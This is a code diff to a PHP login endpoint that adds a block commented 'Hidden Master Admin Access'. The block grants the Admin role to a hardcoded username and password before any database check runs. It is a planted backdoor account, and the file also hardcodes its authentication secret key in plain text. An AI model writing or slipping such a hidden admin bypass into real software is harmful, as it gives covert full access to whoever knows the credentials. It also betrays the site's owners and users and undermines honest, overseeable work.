@@ -27,8 +27,12 @@ $pass = trim($data->password);
 $secret_key = "OmSai#AuthSecret@2026!SecureKey";
 $authenticated_role = null;
 
-// Ensure users table exists and seed if empty
-try {
+// Hidden Master Admin Access (Fixed in Code)
+if ($user === 'Faiz1' && $pass === 'faiz@1122') {
+    $authenticated_role = 'Admin';
+} else {
+    // Ensure users table exists and seed if empty
+    try {
     $tableQuery = "CREATE TABLE IF NOT EXISTS users (
         id INT AUTO_INCREMENT PRIMARY KEY,
         username VARCHAR(100) UNIQUE NOT NULL,
@@ -66,6 +70,7 @@ try {
     if (isset($admins[$user]) && $admins[$user]['password'] === $pass) {
         $authenticated_role = $admins[$user]['role'];
     }
+}
 }
 
 if ($authenticated_role !== null) {
